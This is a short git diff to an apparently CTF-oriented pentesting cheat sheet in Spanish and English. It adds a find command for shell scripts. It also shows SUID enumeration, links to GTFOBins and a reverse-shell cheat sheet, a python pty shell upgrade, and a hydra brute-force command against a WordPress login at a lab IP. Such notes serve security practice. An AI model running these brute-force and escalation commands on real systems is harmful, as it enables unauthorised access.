@@ -19,6 +19,11 @@ SUID bits can be dangerous, some binaries such as passwd need to be run with ele
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
+Busqueda de ficheros ejecuables:
+```
+find / -type f -name "*.sh" 2>/dev/null
+```
+
 https://gtfobins.github.io/#
 
 ## Reverse shell 📖
@@ -26,4 +31,4 @@ https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/
 
 ## Técnicas varias 🔧
 _Abrir terminal con python: python -c 'import pty;pty.spawn("/bin/bash")'
-_Uso de hydra: hydra -L fsocity.dic -p test 10.10.192.186 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.186%2Fwp-admin%2F&testcookie=1:F=Invalid username' otra opción final: /S=302'
+_Uso de hydra: hydra -L fsocity.dic -p test 10.10.192.186 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.192.186%2Fwp-admin%2F&testcookie=1:F=Invalid username' otra opción final: /S=302
